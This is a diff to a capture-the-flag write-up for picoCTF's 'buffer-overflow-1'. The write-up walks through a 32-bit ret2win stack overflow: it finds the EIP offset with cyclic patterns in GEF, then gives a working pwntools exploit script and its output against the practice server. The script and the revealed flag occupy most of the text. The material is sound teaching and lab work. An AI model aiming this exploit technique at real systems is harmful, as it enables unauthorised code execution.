@@ -112,7 +112,7 @@ $eip   : 0x41414141 ("AAAA"?)
 ─────────────────────────────────────────────────────────────────── threads ────
 [#0] Id 1, Name: "vuln", stopped 0x41414141 in ?? (), reason: SIGSEGV
 ```
-Look what happened: all of our registers just got overflowed with our `A`s in ASCII (`0x41` = `A`), including the `$eip`! However, we don't know **how many** `A`s we need to pass in order to reach the `$eip`. To solve this problem, we can use the pwntools `cyclic` command:
+Look what happened: all of our registers just got overflowed with our `A`s in ASCII (`0x41` = `A`), including the `$eip`! However, we don't know **how many** `A`s we need to pass in order to reach the `$eip`. To solve this problem, we can use the pwntools `cyclic` command. This creates a recognizable cycling pattern for it to identify:
 ```
 gef➤  shell cyclic 150
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
@@ -141,7 +141,7 @@ $eip   : 0x6161616c ("laaa"?)
 ─────────────────────────────────────────────────────────────────── threads ────
 [#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
 ```
-We can see that `$eip` is currently overflowed with the pattern `laaa`. let's search for this pattern using `pattern search`:
+We can see that `$eip` is currently overflowed with the pattern `0x6161616c` (`laaa`). let's search for this pattern using `pattern search`:
 ```
 gef➤  pattern search 0x6161616c
 [+] Searching for '0x6161616c'
@@ -157,7 +157,7 @@ Win is at `0x80491f6`. We can now make a simple exploit that connects to the ser
 ```py
 from pwn import *
 payload = b"A"*44 + p32(0x80491f6)        # The p32 function prints this address as little endian (b'\xf6\x91\x04\x08').
-host, port = "saturn.picoctf.net", 61265
+host, port = "saturn.picoctf.net", [PORT_REDACTED]
 
 p = remote(host, port)                    # Opens the connection
 log.info(p.readS())                       # Decodes/prints "Please enter your string:"
@@ -165,3 +165,14 @@ p.sendline(payload)                       # Sends the payload
 log.success(p.readallS())                 # Decodes/prints all program outputs
 p.close()                                 # Closes the connection
 ```
+Let's try running the script on the server:
+```
+kali@kali:~/pico22/buffer-overflow-1$ python3 exp2.py
+[+] Opening connection to saturn.picoctf.net on port [PORT_REDACTED]: Done
+[*] Please enter your string: 
+[+] Receiving all data: Done (100B)
+[*] Closed connection to saturn.picoctf.net port [PORT_REDACTED]
+[+] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+    picoCTF{addr3ss3s_ar3_3asy_********}
+```
+You have completed your first `ret2win` buffer overflow on a x32 binary!
